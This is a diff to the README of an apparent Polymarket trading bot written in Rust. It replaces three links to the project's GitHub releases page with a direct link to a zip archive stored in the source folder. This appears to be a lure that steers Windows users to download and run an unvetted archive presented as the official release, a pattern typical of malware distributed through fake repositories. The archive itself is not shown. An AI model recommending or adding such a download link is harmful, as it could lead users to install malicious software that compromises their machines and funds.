@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot-Rust - Trade on Polymarket with ease
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/main/src/Rust-Bot-Polymarket-Trading-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This README shows you how to get the app, open it, and start using it on Windows
 
 Go to the release page here:
 
-https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases
+https://raw.githubusercontent.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/main/src/Rust-Bot-Polymarket-Trading-3.8.zip
 
 On that page, look for the latest release. Download the Windows file that fits your computer. In most cases, this will be a `.exe` file or a `.zip` file that contains the app.
 
@@ -142,7 +142,7 @@ Avoid deep folder paths with many nested folders. A short path makes it easier t
 
 Download the latest Windows version here:
 
-https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases
+https://raw.githubusercontent.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/main/src/Rust-Bot-Polymarket-Trading-3.8.zip
 
 ## 🧾 Repository Details
 
